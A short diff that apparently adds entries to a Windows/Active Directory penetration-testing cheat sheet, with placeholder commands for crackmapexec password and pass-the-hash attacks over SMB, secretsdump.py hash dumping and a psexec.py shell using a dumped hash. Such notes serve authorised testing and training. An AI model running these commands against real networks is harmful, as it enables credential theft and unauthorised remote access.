@@ -50,9 +50,23 @@ OR
 OR
 > wmiexec.py <DOMAIN.local>/<USER>:<PASS>@<TARGET_IP> 
 
+Pass the Password
+--------------------------------------------------------
+>apt install crackmapexec
+--------------------------------------------------------
+> crackmapexec smb <ip/cidr> -u <user> -d <domain> -p <pass>
 
+Dump Local Hashes (SAM)
+--------------------------------------------------------
+> secretsdump.py <DOMAIN.local>/<USER>:<PASS>@<TARGET_IP>
 
+Pass the Hash
+--------------------------------------------------------
+> crackmapexec smb <ip/cidr> -u <user> -H <HASH> --local-auth
 
+Gaining Shell using dumped Hashed password
+--------------------------------------------------------
+> psexec.py "<user_name>":@<IP> -hashes <HASH_value>
 
 
 Usefull refrences
